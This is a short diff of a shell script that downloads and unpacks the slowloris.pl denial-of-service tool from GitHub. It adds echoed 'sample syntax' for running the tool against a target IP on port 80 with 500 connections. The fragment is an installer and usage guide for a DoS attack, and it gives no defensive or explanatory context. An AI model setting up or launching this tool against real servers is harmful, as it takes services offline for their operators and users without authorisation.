@@ -25,3 +25,6 @@ sleep 1
 wget https://github.com/llaera/slowloris.pl/archive/master.zip
 unzip master.zip
 cd slowloris.pl-master/
+
+echo "Sample syntax"
+echo "sudo perl slowloris.pl -dns <target IP> -port 80 -timeout 240 -num 500 -tcpto 5"
